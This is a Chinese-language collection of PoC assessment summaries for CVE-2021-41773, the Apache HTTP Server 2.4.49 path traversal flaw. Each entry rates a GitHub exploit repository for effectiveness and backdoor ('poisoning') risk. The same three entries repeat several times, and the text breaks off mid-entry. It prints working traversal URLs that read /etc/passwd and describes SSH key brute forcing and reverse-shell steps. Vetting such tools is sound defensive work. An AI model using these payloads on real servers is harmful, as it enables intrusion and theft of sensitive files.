**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
